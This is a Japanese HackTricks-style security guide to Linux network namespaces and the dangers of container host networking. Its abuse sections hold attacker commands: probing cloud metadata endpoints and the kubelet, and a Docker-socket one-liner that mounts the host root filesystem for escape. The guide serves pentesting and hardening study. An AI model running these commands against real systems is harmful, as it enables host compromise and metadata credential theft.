# ネットワーク名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

ネットワーク名前空間は、インターフェイス、IPアドレス、ルーティングテーブル、ARP/neighbor 状態、ファイアウォールルール、ソケット、そして `/proc/net` のようなファイルの内容など、ネットワークに関連するリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、あたかも独自の `eth0`、独自のローカルルート、独自のループバックデバイスを持っているかのように見えます。

セキュリティの観点では、ネットワーク分離は単なるポートバインディング以上の意味を持ちます。プライベートなネットワーク名前空間は、ワークロードが直接観察したり再設定したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナは意図せずにホスト上のリスナー、ホストローカルなサービス、そしてアプリケーションに公開されるべきではなかったネットワーク制御ポイントを見ることができるようになります。

## 動作

新しく作成されたネットワーク名前空間は、インターフェイスが割り当てられるまで空、あるいはほぼ空のネットワーク環境として始まります。コンテナランタイムはその後、仮想インターフェイスを作成または接続し、アドレスを割り当て、ワークロードが期待する接続性を得られるようルートを設定します。ブリッジベースのデプロイでは、通常コンテナはホストのブリッジに接続された veth で接続されたインターフェイスを目にします。Kubernetes では、CNI プラグインが Pod のネットワーキングに相当するセットアップを担当します。

このアーキテクチャは、`--network=host` や `hostNetwork: true` がなぜ極めて大きな変更なのかを説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加することになります。

## ラボ

ほぼ空のネットワーク名前空間は次のように確認できます：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナとホストネットワークのコンテナを次のように比較できます：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
ホストのネットワークを共有するコンテナは、もはや独自の分離されたソケットやインターフェースのビューを持ちません。その変化だけでも、プロセスがどのような権限を持っているかを問う前に重大です。

## 実行時の使用

Docker と Podman は通常、設定しない限り各コンテナに対してプライベートな network namespace を作成します。Kubernetes は通常、各 Pod に対して独自の network namespace を割り当て、Pod 内のコンテナ間で共有されるがホストとは分離されます。Incus/LXC システムも network namespace を基盤とした隔離機能を提供し、より多様な仮想ネットワーキング構成をサポートすることが多いです。

一般的な原則は、プライベートなネットワークがデフォルトの隔離境界であり、host networking はその境界から明示的にオプトアウトするものだという点です。

## 誤設定

最も重要な誤設定は、単純にホストの network namespace を共有することです。これはパフォーマンス向上、低レベルの監視、あるいは利便性のために行われることがありますが、コンテナに対して利用可能な最も明確な境界の一つを失わせます。ホストローカルのリスナーによりより直接的に到達可能になり、localhost 専用のサービスがアクセス可能になる場合があり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような権限は、これらがホスト自身のネットワーク環境に対して適用されるため、はるかに危険になります。

ネットワーク namespace がプライベートであっても、ネットワーク関連の権限を過剰に与えることは別の問題です。プライベートな namespace は一定の助けになりますが、生のソケットや高度なネットワーク制御が無害になるわけではありません。

Kubernetes では、`hostNetwork: true` は Pod レベルのネットワーク分割にどれだけ信頼を置けるかも変えます。Kubernetes のドキュメントは、多くの network plugins が `hostNetwork` Pod のトラフィックを `podSelector` / `namespaceSelector` のマッチングで適切に区別できず、そのため通常のノードトラフィックとして扱うことを指摘しています。攻撃者の観点では、これは侵害された `hostNetwork` ワークロードをオーバーレイネットワーク上のワークロードと同じポリシー前提で制約された通常の Pod と見なすのではなく、ノードレベルのネットワーク足場として扱うべきであることを意味します。

## 悪用

隔離が弱い構成では、攻撃者はホスト上のリスニングサービスを調べたり、loopback にのみバインドされた管理エンドポイントに到達したり、環境や付与された権限によってはトラフィックをスニッフィングしたり妨害したり、`CAP_NET_ADMIN` がある場合にはルーティングやファイアウォールの状態を再構成したりする可能性があります。クラスタ内では、これにより横移動やコントロールプレーンの偵察が容易になることもあります。

ホストネットワーキングが疑われる場合は、まず表示されているインターフェースやリスナーが分離されたコンテナのネットワークではなくホストに属していることを確認してください:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-onlyサービスは、多くの場合、最初に興味深い発見になります:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
ネットワーク capabilities が存在する場合、ワークロードが可視スタックを検査または変更できるかをテストしてください:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
最新のカーネルでは、ホストのネットワーキングと `CAP_NET_ADMIN` を組み合わせることで、単なる `iptables` / `nftables` の変更を超えてパケット経路が露出することがあります。`tc` の qdiscs と filters もネームスペース単位で適用されるため、ホストのネットワークネームスペースを共有している場合、それらはコンテナから見えるホストのインターフェースに適用されます。さらに `CAP_BPF` が存在する場合、TC や XDP ローダーなどのネットワーク関連の eBPF プログラムも関係してきます:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
これは重要です。attacker は、firewall rules を書き換えるだけでなく、host interface レベルでトラフィックを mirror、redirect、shape、drop できる可能性があるからです。private network namespace 内ではこれらの操作は container のビューに封じられますが、shared host namespace では host-impacting になります。

cluster や cloud 環境では、host networking はまた metadata や control-plane-adjacent services の素早いローカル recon を正当化します：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完全な例: Host Networking + Local Runtime / Kubelet Access

host networking は自動的に host root を提供するわけではありませんが、ノード自身からのみ到達可能に意図されたサービスをしばしば露出します。これらのサービスのうちの一つが弱く保護されていると、host networking は直接的な privilege-escalation の経路になります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上の Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響:

- ローカルのランタイム API が適切に保護されていない場合、ホストが直接侵害される可能性がある
- kubelet またはローカルエージェントに到達できる場合、cluster reconnaissance や lateral movement につながる可能性がある
- `CAP_NET_ADMIN` と組み合わせると、トラフィックの操作や denial of service を引き起こす可能性がある

## チェック

これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートやリスナーが見えているか、そして実際に capabilities をテストする前にネットワークの見え方が既にホストに似ているかどうかを把握することです。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
ここで興味深い点：

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

コンテナを確認する際は、ネットワーク名前空間を capability セットと合わせて常に評価してください。ホストネットワーキングと強力なネットワーク capability の組み合わせは、ブリッジネットワーキングと限定されたデフォルト capability セットとは全く異なる姿勢です。

## 参考資料

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
